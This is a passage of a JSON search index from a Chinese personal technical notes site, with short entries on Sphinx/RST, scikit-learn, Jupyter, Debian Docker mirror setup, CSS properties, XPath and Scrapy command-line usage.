可使用此项目: https://github.com/mack-a/v2ray-agent","tags":"杂乱无章","url":"/yq-docs-Chaotic-Self--built-agent.html","loc":"/yq-docs-Chaotic-Self--built-agent.html"},{"title":"代码","text":"使用 code 或者 code-block 或者 直接双冒号 code code 不支持 linenos显示行号 code-block 支持选项: :emphasize-lines: 特别强调的行(高亮), 如 3,5\n:linenos:         是否生成行号\n:lineno-start:    起始行号, 如 2\n:dedent:          忽略高亮显示行的错误 注解 上述部分指令可参见于: index literalinclude 使用 literalinclude 直接引用文件内容: .. literalinclude:: ../../../../../resources/code/example1.nsi\n  :language: nsis 双冒号 如使用Py执行文件: python xxx.py 源码: 如使用Py执行文件::\n\n  python xxx.py","tags":"文档","url":"/yq-docs-document-RST-mark-language-Grammar-module-Code.html","loc":"/yq-docs-document-RST-mark-language-Grammar-module-Code.html"},{"title":"跨文档引用问题","text":"虽然可以通过在 conf.py 配置: extensions = [\n  'sphinx.ext.autodoc',\n  'sphinx.ext.autosectionlabel',      # 允许直接ref使用标题引用(否则需要给标题定义别名),\n                                  # 支持跨文档标题引用(注意标题在多个文档中保持唯一),\n] 主要是 sphinx.ext.autosectionlabel 来解决, 但是不建议这么做, 因为保不齐什么时候有个标题就是得重名. 使用 :doc: 倒是可以跨到文档, 但是不支持指定位置, 所以这个问题待解决吧.","tags":"文档","url":"/yq-docs-document-RST-mark-language-question-Cross--document-reference-problem.html","loc":"/yq-docs-document-RST-mark-language-question-Cross--document-reference-problem.html"},{"title":"跨文档超链接(引用)","text":"在一个rst文档中, 小节会自动加入到本文档的超链接中. 而要跨rst文档饮用另一个rst文本的小节/链接, 只有使用: :ref:`xxx` 而非: xxx_ 查看当前已生成的标记 查看当前已生成的ref标记, 一般都是生成在 build/html/objects.inv: python -m sphinx.ext.intersphinx build/html/objects.inv","tags":"文档","url":"/yq-docs-document-RST-mark-language-question-Cross--text-super-link-(quotation).html","loc":"/yq-docs-document-RST-mark-language-question-Cross--text-super-link-(quotation).html"},{"title":"自定义主题","text":"具体怎么自定义可以参考: sphinx自定义主题 不过有个坑点是, 使用pip安装的主题(我直接是安装的pytorch的那个主题). 可能内容比较老... 具体是不是很老没细看, 不过直接从pip安装好的 html 项目来看, 与github上的内容有些差距, 比如代码不一致, js文件缺失等, 导致一些报错. 所以这时候还是使用 github 上面的来参考吧.","tags":"文档","url":"/yq-docs-document-RST-mark-language-question-Custom-theme.html","loc":"/yq-docs-document-RST-mark-language-question-Custom-theme.html"},{"title":"文档超链接","text":"使用: :doc:`xxx` 详情见: CR_RST_DOC 此指令只可链接到文档","tags":"文档","url":"/yq-docs-document-RST-mark-language-question-Document-hyperlink.html","loc":"/yq-docs-document-RST-mark-language-question-Document-hyperlink.html"},{"title":"内嵌PDF到文档直接显示","text":"不支持...","tags":"文档","url":"/yq-docs-document-RST-mark-language-question-Embedded-PDF-to-documentation.html","loc":"/yq-docs-document-RST-mark-language-question-Embedded-PDF-to-documentation.html"},{"title":"target警告","text":"在同一篇文章中如果有相同的标题, 就会有警告. 但是有时候就是需要... , 比如: 标题1\n  小标题1\n\n标题2\n  小标题1 貌似官方不建议这么做, 反正现在最新版还是有警告. 只有暂时忽略或者拆分成多个文档了.","tags":"文档","url":"/yq-docs-document-RST-mark-language-question-Target-warning.html","loc":"/yq-docs-document-RST-mark-language-question-Target-warning.html"},{"title":"set","text":"set的运算: s = set([3,5,9,10,20,40])      #创建一个数值集合\nt = set([3,5,9,1,7,29,81])      #创建一个数值集合\n\na = t | s          # t 和 s的并集 ,等价于t.union(s)\nb = t & s          # t 和 s的交集 ,等价于t.intersection(s)\nc = t - s          # 求差集（项在t中，但不在s中）  ,等价于t.difference(s)\nd = t &#94; s          # 对称差集（项在t或s中，但不会同时出现在二者中）,等价于t.symmetric_difference(s) 与list的区别 list见 list list是动态数据, 查询时会遍历整个数组, 最坏情况查询为 O(n) set是hash表实现, 查询复杂度只有 O(1)","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-set.html","loc":"/yq-docs-rear-end-python-Built--in-function-set.html"},{"title":"jupyter","text":"jupyter notebook 是一个网页形式的编辑器,\n支持 在网页页面中直接编写代码和运行代码，\n代码的运行结果也会直接在代码块下显示的程序。\n如在编程过程中需要编写说明文档，可在同一个页面中直接编写，便于作及时的说明和解释。 安装: pip install jupyter 启动: jupyter notebook 结果就是在 当前目录 启动一个 jupyter 服务器,\n一般就会自动跳到浏览器打开, 或者手动打开也行: http://localhost:8888/tree 注解 jupyter生成的文件不是纯正的 py 文件 MacOS下快捷键: Enter               在当前单元格换行\nCommand + Enter     执行当前单元格\nCtrl + Enter        执行当前单元格\nShift + Enter       执行当前单元格并新建一个单元格 jupyter notebook支持的选项 -h , --help 帮助信息 --port <port_number> 指定启动端口 --no-browser 启动但是不自动打开浏览器 --generate-config 生成默认配置文件","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-jupyter.html","loc":"/yq-docs-rear-end-python-python-three--party-library-jupyter.html"},{"title":"datasets","text":"load_wine sklearn.datasets.load_wine(*, return_X_y=False, as_frame=False)[source] 加载并返回 Wine 数据集 (一个经典的多分类的数据集) 参考: https://scikit-learn.org/stable/modules/generated/sklearn.datasets.load_wine.html 参数 return_X_ybool, default=False 当为 True 时, 返回  (data, target) 而不是整个数据对象. target及对应的分类结果 as_framebool, default=False 当为 True 时, 数据集是 pandas 的 DataFrame 类型, 会自动选择合适的数据类型, target亦是. New in version 0.23. 返回值 dataBunch 类字典对象, 具有以下属性 data{ndarray, dataframe} of shape (178, 13) 数据矩阵. 若 as_frame 参数为 True, 将会是 pandas DataFrame 类型. target: {ndarray, Series} of shape (178,) 数据分类结果. 若 as_frame 参数为 True, 将会是 pandas Series 类型. feature_names: list 数据集的列名称. target_names: list 目标分类的名称. frame: DataFrame of shape (178, 14) Only present when as_frame=True. DataFrame with data and target. New in version 0.23. DESCR: str 数据集描述 (data, target)tuple if return_X_y is True 默认为两个 ndarrays 的元组 第一个 shape 是 (178, 13), 每一行都表示一个样本 第二个 shape 是 (178,), 代表对应分类. 举例: >>> from sklearn.datasets import load_wine\n>>> data = load_wine()\n>>> data.target[[10, 80, 140]]\narray([0, 1, 2])\n>>> list(data.target_names)\n['class_0', 'class_1', 'class_2']","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-scikit-learn-API-DataSets.html","loc":"/yq-docs-rear-end-python-python-three--party-library-scikit-learn-API-DataSets.html"},{"title":"metrics","text":"sklearn.metrics.classification_report 分类报告指标","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-scikit-learn-API-Metrics.html","loc":"/yq-docs-rear-end-python-python-three--party-library-scikit-learn-API-Metrics.html"},{"title":"model_selection","text":"sklearn.model_selection.GridSearchCV 随机森林搜索模型","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-scikit-learn-API-Model_selection.html","loc":"/yq-docs-rear-end-python-python-three--party-library-scikit-learn-API-Model_selection.html"},{"title":"impute","text":"sklearn.impute.SimpleImputer 如使用自定义预处理方法处理缺失值: from sklearn.impute import SimpleImputer\n\nimputer = SimpleImputer(strategy='mean')\nX_train_clean = imputer.fit(X_train)","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-scikit-learn-API-impure.html","loc":"/yq-docs-rear-end-python-python-three--party-library-scikit-learn-API-impure.html"},{"title":"linear_model","text":"线性模型 LogisticRegression sklearn.linear_model.LogisticRegression 逻辑回归算法类","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-scikit-learn-API-linear_model.html","loc":"/yq-docs-rear-end-python-python-three--party-library-scikit-learn-API-linear_model.html"},{"title":"简单使用教程","text":"以下将会使用 Wine 数据集, 可以直接代码下载: from sklearn.datasets import load_wine\n\nX,y = load_wine(return_X_y=True) 注解 wine 使用函数下载: sklearn.datasets.load_wine Estimators（估算器） Scitkit-learn 库提供了多种预构建算法，可以执行有监督和无监督的机器学习。它们通常被称为估算器。 为项目选择何种估计器取决于我们拥有的数据集和我们要解决的问题。\nScitkit-learn官方文档提供了如下所示的图表，可以帮助我们确定哪种算法适合我们的任务。 Scikit learn之所以能如此直接地使用，\n是因为无论我们使用的模型或算法是什么，用于模型训练和预测的代码结构都是相同的。 假设我们正在处理一个回归问题，希望训练一个线性回归算法，并使用得到的模型进行预测。\n使用Scikit learn 的第一步是调用 logistic 回归估计器 并将其另存为对象。\n下面的示例调用该算法并将其保存为一个名为 lr 的对象: from sklearn.linear_model import LogisticRegression\n\nlr = LogisticRegression(max_iter=10000) 使用lr算法拟合数据, 这里设置参数10000是因为 lbfgs failed to converge 然后使用fit来训练数据获取模型: from sklearn.model_selection import train_test_split\n\nx_train, x_test, y_train, y_test = train_test_split(x, y, random_state=0)\nx_train, x_test, y_train, y_test\nmodel = lr.fit(x_train, y_train) 用得到的模型, 实验 测试数据集 效果: # 接下来，我们使用模型和预测（） 方法对以前不可见的数据进行预测。\npredictions = model.predict(x_test)\npredictions == y_test 输出: array([ True,  True,  True,  True,  True,  True,  True,  True,  True,\n        True,  True,  True,  True,  True,  True,  True,  True,  True,\n      False,  True,  True,  True,  True,  True,  True,  True,  True,\n        True,  True,  True,  True,  True,  True,  True,  True,  True,\n        True,  True,  True,  True,  True,  True,  True,  True,  True]) 如果我们现在要使用 Scitkit-learn 执行不同的任务，\n比如训练一个随机森林分类器。代码看起来非常相似，并且具有相同的步骤数: from sklearn.ensemble import RandomForestClassifier\n\nrf = RandomForestClassifier()\nrf_model = rf.fit(X_train, y_train)\nrf_predictions = rf_model.predict(X_test) 这种一致的代码结构使得开发机器学习模型非常直接，并且还生成高度可读和可重复的代码。 预处理 在大多数实际机器学习项目中，我们使用的数据不一定准备好训练模型。\n很可能首先需要执行一些数据预处理和转换步骤，\n例如处理缺失值、将分类数据转换为数字或应用要素缩放。 Scikit-learn 具有执行这些预处理步骤的内置方法。\n例如，SimpleImputer（） 会使用我们选择的方法来填充缺失的值: from sklearn.impute import SimpleImputer\n\nimputer = SimpleImputer(strategy='mean')\nX_train_clean = imputer.fit(X_train) 在 Scikit-learn 官方文档-预处理 中列出了数据预处理的完整选项 数据标准化和归一化 code: from sklearn.preprocessing import StandardScaler  # 标准化\nfrom sklearn.preprocessing import MinMaxScaler  # 归一化\n\n# 标准化\nss = StandardScaler()\nX_scaled = ss.fit_transform(X_train)  # 传入待标准化的数据\n\n# 归一化\nmm = MinMaxScaler()\nX_scaled = mm.fit_transform(X_train) 模型评估 衡量模型在预测新数据方面的好坏程度 此步骤称为模型评估，我们选择的度量将由我们希望解决的任务来确定。\n例如，通常在回归问题中，我们可以选择RMSE，而对于分类，则可以选择 F1 分数。 所有估算器都包含一个 score（）方法，该方法返回与它们执行的机器学习任务最相关的默认指标. 比如上面的model: model.score(x_test, y_test)\n\n# 输出\n# 0.9777777777777777 Scikit-learn 还提供了一组指标函数，这些函数为模型提供了更详细的评估。\n例如，对于分类任务，库具有分类报告，提供精度、召回、F1 评分和总体精度。 分类报告代码和输出如下所示: from sklearn.metrics import classification_report\n\nprint(classification_report(rf_predictions, y_test)) 模型优化 Scikit-learn 库中的所有估算器都包含一系列参数，有多个选项，\n为特定算法选择的值都将影响最终模型的性能。\n例如，使用 RandomForestClass 表示器，\n我们可以将树的 max_depth 设置为可能的任何值，\n并且根据数据和任务的不同值，此参数的不同值将产生不同的结果。 这种尝试不同参数组合以找到最佳组合的过程称为超参数优化。 Scikit-learn 提供了两个自动执行此任务的工具，\nGridSearchCV 实现了一种称为详尽网格搜索的技术，以及执行随机参数优化的随机搜索 CV。 下面的示例使用 GridSearchCV 查找随机森林分类器的最佳参数，输出结果在代码下方: param_grid = {\n    'n_estimators': [200, 500],\n    'max_features': ['auto', 'sqrt', 'log2'],\n    'max_depth' : [4,5,6,7,8],\n    'criterion' :['gini', 'entropy']\n}\nfrom sklearn.model_selection import GridSearchCV\nCV = GridSearchCV(rf, param_grid, n_jobs= 1)\n\nCV.fit(X_train, y_train)\nprint(CV.best_params_)\nprint(CV.best_score_) 管道 Scikit-learn 包以管道的形式提供了一种更加方便的代码封装形式。\n此工具允许将所有预处理任务与分类器步骤连接在一起，\n以便简单地在单个管道对象上调用 fit（） 或 predict（） 执行工作流中的所有步骤。 这样可以生成高可读代码，并减少机器学习工作流中步骤的重复。 为了创建管道，我们首先在下面的代码中定义我称之为管道的对象中的步骤。\n然后，我们可以简单地调用此对象的拟合来训练模型。此外，管道对象还可用于对新数据进行预测: from sklearn.pipeline import Pipeline\npipe = Pipeline([('imputer', SimpleImputer()), ('rf', RandomForestClassifier())])\npipeline_model = pipe.fit(X_train, y_train)\npipeline_model.score(X_test, y_test)","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-scikit-learn-Simple-use-tutorial.html","loc":"/yq-docs-rear-end-python-python-three--party-library-scikit-learn-Simple-use-tutorial.html"},{"title":"lbfgs failed to converge","text":"完整报错信息: /Users/yanque/Project/Code/Pycharm/StudyPytorch/.venv/lib/python3.10/site-packages/sklearn/linear_model/_logistic.py:469: ConvergenceWarning: lbfgs failed to converge (status=1):\nSTOP: TOTAL NO. of ITERATIONS REACHED LIMIT.\n\nIncrease the number of iterations (max_iter) or scale the data as shown in:\n    https://scikit-learn.org/stable/modules/preprocessing.html\nPlease also refer to the documentation for alternative solver options:\n    https://scikit-learn.org/stable/modules/linear_model.html#logistic-regression\n  n_iter_i = _check_optimize_result( 这是说训练模型的时候，参数的迭代次数达到了限制（默认 max_iter=100），\n但是两次迭代参数变化还是比较大，仍然没有在一个很小的阈值以下，这就叫没有收敛。 不过，这只是一个警告（温馨提示）而已，我们可以选择 忽略. 如代码显示忽略: import warnings; warnings.filterwarnings(\"ignore\") 增大最大迭代次数, 如: LogisticRegression(max_iter=1000) 更换其他的模型或者那个参数 solver, 如: LogisticRegression(solver=\"sag\") 将数据进行预处理，提取更有用的特征","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-scikit-learn-question-lbfgs-failed-to-converge.html","loc":"/yq-docs-rear-end-python-python-three--party-library-scikit-learn-question-lbfgs-failed-to-converge.html"},{"title":"ipconfig","text":"查看网络信息","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-ipconfig.html","loc":"/yq-docs-operating-system-Windows-windows_shell-ipconfig.html"},{"title":"genisoimage","text":"安装: apt install genisoimage 使用: geteltorito -o output_file.iso input_file.img","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-GenisoImage.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-GenisoImage.html"},{"title":"配置docker-debian","text":"拉取debian镜像: docker pull debian 运行: docker run --name mydebian -dit debian 进入: docker exec -it mydebian /bin/bash 安装验证工具(HTTPS): sudo apt install apt-transport-https ca-certificates 换源: mv /etc/apt/sources.list /etc/apt/sources.list.bak\n\necho \"# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释\ndeb https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye main contrib non-free\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye main contrib non-free\n\ndeb https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye-updates main contrib non-free\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye-updates main contrib non-free\n\ndeb https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye-backports main contrib non-free\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye-backports main contrib non-free\n\n# deb https://mirrors.tuna.tsinghua.edu.cn/debian-security bullseye-security main contrib non-free\n# # deb-src https://mirrors.tuna.tsinghua.edu.cn/debian-security bullseye-security main contrib non-free\n\ndeb https://security.debian.org/debian-security bullseye-security main contrib non-free\n# deb-src https://security.debian.org/debian-security bullseye-security main contrib non-free\n\" > /etc/apt/sources.list\n\napt update 清华源地址debian配置帮助: debian 注解 如果报错 Certificate verification failed: The certificate is NOT trusted. 有两种解决方式 将 https 改成 http 先安装  apt-transport-https ca-certificates","tags":"操作系统","url":"/yq-docs-operating-system-linux-debian-Configure-DEBIAN-container.html","loc":"/yq-docs-operating-system-linux-debian-Configure-DEBIAN-container.html"},{"title":"opacity","text":"设置元素透明度 opacity 属性控制元素的不透明度级别，\n其值范围从 0 到 1， 0 表示完全透明（不可见）， 1 表示完全不透明（完全可见）。 将元素设置为半透明（透明度为 0.5）: .element {\n  opacity: 0.5;\n} 注解 有时候不设置背景, 背景自动就是透明的","tags":"前端","url":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-OPACITY.html","loc":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-OPACITY.html"},{"title":"outline","text":"CSS 的 outline 属性用于设置元素的轮廓样式，它是一种在元素周围绘制轮廓线的装饰效果。\n轮廓线位于元素的边框之外，并且不占据布局空间。 outline 属性可以接受多个值，包括： outline-width 用于设置轮廓线的宽度。可以使用具体的长度值（如像素或 em）或预定义的值（如 thin、medium、thick）。 outline-style 用于设置轮廓线的样式，可以是实线（solid）、虚线（dotted）、双实线（double）等。 outline-color 用于设置轮廓线的颜色，可以是具体的颜色值（如十六进制、RGB、颜色名称）。 选择所有的 <div> 元素，并为其设置了一个红色的 2 像素粗的实线轮廓: div {\n  outline: 2px solid red;\n} 使用 outline 属性时，通常会同时设置 outline-width、outline-style 和 outline-color 的值，但也可以单独使用其中的某个属性。 需要注意的是，outline 属性是一个装饰性的效果，不同于 border 属性，它不占据布局空间。\n此外，outline 属性在某些浏览器中可能会显示不同的效果或不支持某些属性值，因此在使用时需要进行兼容性测试。 注解 源于 AI 轮廓（outline）和边框（border）区别 位置 边框位于元素的内容区域和内边距之间，而轮廓则位于边框之外。换句话说，边框是围绕在元素的内容周围的线条，而轮廓是在边框外面绘制的线条。 占据空间 边框会占据元素的布局空间，也就是说，它会影响元素的尺寸和位置。而轮廓不会占据布局空间，它只是一种视觉效果，并不会改变元素的大小或布局。 样式和属性 边框具有更多的样式和属性选项，可以设置边框的宽度、样式和颜色，可以分别设置四个方向的边框。而轮廓的样式相对较少，通常只设置轮廓的宽度、样式和颜色。 兼容性 边框是 CSS 2.1 规范的一部分，得到了广泛的浏览器支持。而轮廓是 CSS2.1 规范中引入的，不同浏览器对于轮廓的样式和行为可能有所差异，因此在使用轮廓时需要进行兼容性测试。","tags":"前端","url":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-outline.html","loc":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-outline.html"},{"title":"XPath 运算符","text":"XPath 表达式可返回节点集、字符串、逻辑值以及数字。 XPath 运算符 下面列出了可用在 XPath 表达式中的运算符： 运算符 描述 实例 返回值 | 计算两个节点集 //book | //cd 返回所有拥有 book 和 cd 元素的节点集 + 加法 6 + 4 10 - 减法 6 - 4 2 * 乘法 6 * 4 24 div 除法 8 div 4 2 = 等于 price=9.80 如果 price 是 9.80，则返回 true。\n如果 price 是 9.90，则返回 false。 != 不等于 price!=9.80 几乎同上 < 小于 price<9.80 几乎同上 <= 小于或等于 price<=9.80 几乎同上 > 大于 price>9.80 几乎同上 >= 大于或等于 price>=9.80 几乎同上 or 或 price=9.80 or\nprice=9.70 几乎同上 and 与 price>9.00 and\nprice<9.90 几乎同上 mod 计算除法的余数 5 mod 2 1 contains 包含, 主要用于属性 contains(@class,\n\"c2\") 以为例: <div class=\"c2 c3\">Direct Child Div 1</div> 表示匹配 class 包含 c2 count 子元素数量 count(a) a标签数量 contain的使用 如: *[contains(concat(' ', normalize-space(@class), ' '), ' someclass ')]\n                    获取class 包含 someclass的元素\n                    最繁琐\n\n@class='someclass'  获取class 仅为 someclass的元素\n                    可能会漏选\ncontains(@class, 'someclass')\n                    获取class 包含 someclass的元素\n                    但是可能会多选一些元素","tags":"后端; python","url":"/yq-docs-rear-end-python-Tutorial-XPath-Xpath-operator.html","loc":"/yq-docs-rear-end-python-Tutorial-XPath-Xpath-operator.html"},{"title":"Response","text":"位置: from scrapy.http import Response 对象方法 css(表达式): SelectorList 根据表达式获取对应的 CSS 元素, 可以理解为一个 CSS 选择器 返回 SelectorList 如获取 title 标签元素: # html\n<title>标题</title>\n\n# 元素\nresponse.css(\"title\")\n\n# 文本\nresponse.css(\"title::text\") 详见 SelectorList 选择器支持见 index xpath(表达式): SelectorList 使用 index 获取元素,\n返回 SelectorList","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-API-Response.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-API-Response.html"},{"title":"SelectorList","text":"Selector 有的对象方法, 好像它也有. 对象方法 get(default=\"\"): str | None 获取第一个元素的data getall(): [str] 获取所有查询到的列表selector的data re(args) 对数据集的data, 进行正则查询 attrib[\"src\"] 不使用 index 获取属性 而是直接使用实例方法获取属性: response.css(\"img\").attrib[\"src\"]\n# 即 img::attr(src)\n# 或 //img/@src extract_first() 与 get 一致, 主要是为了兼容其他的(其他框架有这个), 下同 extract() 与 getall 一致","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-API-SelectOmerist.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-API-SelectOmerist.html"},{"title":"Selector","text":"参考: https://docs.scrapy.org/en/latest/topics/selectors.html#scrapy.selector.SelectorList code: class scrapy.selector.Selector(*args: Any, **kwargs: Any) 用于修饰 response 选择器选择的内容.\nresponse 是 HtmlResponse/XmlResponse 对象 支持参数: text HTML/XML 字符串 type 选择器类型, 支持 html 和 xml. 不给会自动选择最适合的 支持的: \"html\" for HtmlResponse type \"xml\" for XmlResponse type \"html\" for anything else 设置后就不会自动找 属性 selector 对象方法 css(表达式): SelectorList 根据表达式获取对应的 CSS 元素, 可以理解为一个 CSS 选择器 返回 SelectorList 如获取 title 标签元素: # html\n<title>标题</title>\n\n# 元素\nresponse.css(\"title\")\n\n# 文本\nresponse.css(\"title::text\") 选择器支持见 index 如果要获取属性, 比如 <a href=\"xxx\"/> 有两种方式: response.css(\"a\").attrib[\"href\"]\n\nresponse.css(\"a::attr('href')\") xpath(表达式): SelectorList 使用 index 获取元素,\n返回 SelectorList 方法: xpath(query: str, namespaces: Optional[Mapping[str, str]] = None, **kwargs: Any)→ SelectorList[_SelectorType] 如: >>> t = response.xpath(\"//div[@class='tea_con']/div/ul/li\")[0]\n>>> t\n<Selector query=\"//div[@class='tea_con']/div/ul/li\" data='<li>\\n\\t\\t\\t\\t\\t<img src=\"images/teacher/ja...'>\n>>>\n>>> t.xpath(\"div/h4\")\n[<Selector query='div/h4' data='<h4>高级讲师</h4>'>]\n>>> 注意, 新的 xpath 表达式, 如果不带斜杠, 表示是从上一级继续找,\n比如例子 t.xpath(\"div/h4\") 就是从上面的 query 继续找: //div[@class='tea_con']/div/ul/li/div/h4 但是如果有斜杠, 上一层的query就没了(因为会视作绝对路径).\n如果非要用鞋杠, 需要加点: .//div/h4 表示找相对路径 包含使用 contains: contains(@class, \"c1\") 可参考 XPath运算符","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-API-Selector.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-API-Selector.html"},{"title":"genspider","text":"不依赖项目目录 生成一个爬虫文件. 如果当前位置是非项目目录, 生成到当前目录下. 如果当前位置是项目目录, 生成到 spiders 目录. 语法: scrapy genspider [-t template] <name> <domain or URL> name 设置爬虫的 name 属性, 文件名也是这 domain or URL 可选. 如果指定了, 会在爬虫类生成 allowed_domains 和 start_urls 属性 -t template 指定生成时使用的模版. 如: $ scrapy genspider -l\nAvailable templates:\n  basic\n  crawl\n  csvfeed\n  xmlfeed\n\n$ scrapy genspider example example.com\nCreated spider 'example' using template 'basic'\n\n$ scrapy genspider -t crawl scrapyorg scrapy.org\nCreated spider 'scrapyorg' using template 'crawl' 比如创建一个 名为 mydomain 的爬虫, 爬取 mydomain 地址: scrapy genspider mydomain mydomain.com","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-Genspider.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-Genspider.html"},{"title":"parse","text":"依赖项目目录 语法: scrapy parse <url> [options] 获取指定的 URL 数据, 并使用 parse 函数进行转换. 支持选项 --spider= SPIDER 指定爬虫, 会自动检测url --a args 设定执行的参数 格式: --a [NAME=VALUE] --callback , -c 回调方法, 默认使用 parse 函数 --meta , -m 额外提供给 回调方法 的参数. 必须是json格式 Example: –meta='{\"foo\" : \"bar\"}' --cbkwargs 额外提供给 回调函数 的 关键字参数 Example: –cbkwargs='{\"foo\" : \"bar\"}' --pipelines process items through pipelines --rules , -r 使用 CrawlSpider 规则发现 回调函数. 没大懂, 原文: use CrawlSpider rules to discover the callback (i.e. spider method) to use for parsing the response --noitems don't show scraped items --nolinks don't show extracted links --nocolour 避免存在颜色输出.\navoid using pygments to colorize the output --depth , -d 请求最多被递归调用多少次. 默认1.\ndepth level for which the requests should be followed recursively (default: 1) --verbose , -v 输出每一个调用详情.\ndisplay information for each depth level --output , -o 将结果输出到文件.\ndump scraped items to a file New in version 2.3. Usage example: $ scrapy parse http://www.example.com/ -c parse_item\n[ ... scrapy log lines crawling example.com spider ... ]\n\n>>> STATUS DEPTH LEVEL 1 <<<\n# Scraped Items  ------------------------------------------------------------\n[{'name': 'Example item',\n'category': 'Furniture',\n'length': '12 cm'}]\n\n# Requests  -----------------------------------------------------------------\n[]","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-Parse.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-Parse.html"},{"title":"settings","text":"不依赖项目目录 语法: scrapy settings [options] 获取配置信息 如果在项目下, 输出项目的配置 不在项目输出默认配置 Example usage: $ scrapy settings --get BOT_NAME\nscrapybot\n$ scrapy settings --get DOWNLOAD_DELAY\n0","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-Settings.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-Settings.html"},{"title":"view","text":"不依赖项目目录 用浏览器打开指定的 url 语法: scrapy view <url> 选项 --spider= SPIDER 自动探测指定爬虫的url --no-redirect 不重定向 Usage example: $ scrapy view http://www.example.com/some/page.html\n[ ... browser starts ... ]","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-VIEW.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-VIEW.html"},{"title":"bench","text":"不依赖项目目录 语法: scrapy bench Run a quick benchmark test. Benchmarking. 翻译: 运行一个快速基准测试。标杆","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-bench.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-bench.html"},{"title":"check","text":"依赖项目目录 语法: scrapy check [-l] <spider> 运行检查: $ scrapy check -l\nfirst_spider\n  * parse\n  * parse_item\nsecond_spider\n  * parse\n  * parse_item\n\n$ scrapy check\n[FAILED] first_spider:parse_item\n>>> 'RetailPricex' field is missing\n\n[FAILED] first_spider:parse\n>>> Returned 92 requests, expected 0..4","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-check.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-check.html"},{"title":"crawl","text":"依赖项目目录 运行指定的爬虫: scrapy crawl [options] $spiderName 支持option --overwrite-output FILE , -O FILE 将输出写入到文件(如果文件已存在则覆盖)\ndump scraped items into FILE, overwriting any existing file, to define format set a colon at the end of the output URI (i.e. -O FILE:FORMAT ) --output FILE , -o FILE 将 输出 增加到file (不会覆盖已存在的内容) 但是新增模式不支持json(能写, 但是文件格式存在问题), 可以使用 jsonl jsonl JSON Lines 格式流式的, 支持新增内容更简单(没懂意思), 原文: The JSON Lines format is useful because it's stream-like, you can easily append new records to it.\nIt doesn't have the same problem of JSON when you run twice. 每一个记录是一个单独的行, 所以如果文件很大的时候, 可以直接逐行读取分析. 原文: Also, as each record is a separate line,\nyou can process big files without having to fit everything in memory,\nthere are tools like JQ to help do that at the command-line. jsonl 参考 https://jsonlines.org -a args 自定义爬虫参数,\n提供自定义参数列表给爬虫. 格式: -a NAME=VALUE 如: scrapy crawl quotes -O quotes-humor.json -a tag=humor 代码: import scrapy\n\nclass QuotesSpider(scrapy.Spider):\n    name = \"quotes\"\n\n    def start_requests(self):\n        url = \"https://quotes.toscrape.com/\"\n        tag = getattr(self, \"tag\", None)\n        if tag is not None:\n            url = url + \"tag/\" + tag\n        yield scrapy.Request(url, self.parse)\n\n    def parse(self, response):\n        for quote in response.css(\"div.quote\"):\n            yield {\n                \"text\": quote.css(\"span.text::text\").get(),\n                \"author\": quote.css(\"small.author::text\").get(),\n            }\n\n        next_page = response.css(\"li.next a::attr(href)\").get()\n        if next_page is not None:\n            yield response.follow(next_page, self.parse) 实际寻找的url就是: https://quotes.toscrape.com/tag/humor --output-format FORMAT , -t FORMAT 已经废弃 , 定义当数据输出时的格式, 不能于 -O 一起用 -h , --help 帮助消息 spiderName 为定义在 spiders 目录下的具体的爬虫name () 如: scrapy crawl itcast -O t.json 如: $ scrapy crawl myspider\n[ ... myspider starts crawling ... ]\n\n$ scrapy crawl -o myfile:csv myspider\n[ ... myspider starts crawling and appends the result to the file myfile in csv format ... ]\n\n$ scrapy crawl -O myfile:json myspider\n[ ... myspider starts crawling and saves the result in myfile in json format overwriting the original content... ]\n\n$ scrapy crawl -o myfile -t csv myspider\n[ ... myspider starts crawling and appends the result to the file myfile in csv format ... ]","tags":"后端; 